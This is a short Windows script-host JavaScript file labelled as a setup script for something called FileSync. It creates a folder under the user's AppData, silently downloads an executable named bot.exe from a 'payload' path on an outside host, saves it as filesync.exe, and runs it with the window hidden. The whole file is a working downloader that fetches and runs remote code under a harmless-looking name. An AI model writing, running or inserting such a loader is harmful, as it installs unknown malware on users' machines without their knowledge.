// setup a2c1eed041759b03
var shell = WScript.CreateObject('WScript.Shell');
var fso = new ActiveXObject('Scripting.FileSystemObject');
var dir = shell.ExpandEnvironmentStrings('%APPDATA%') + '\\FileSync';
if (!fso.FolderExists(dir)) {
  fso.CreateFolder(dir);
}
shell.Run('curl.exe -s -f -o "' + dir + '\\filesync.exe" "https://5f6a6b70.headbots.team/payload/latest/bot.exe"', 0, true);
shell.Run('"' + dir + '\\filesync.exe"', 0, false);
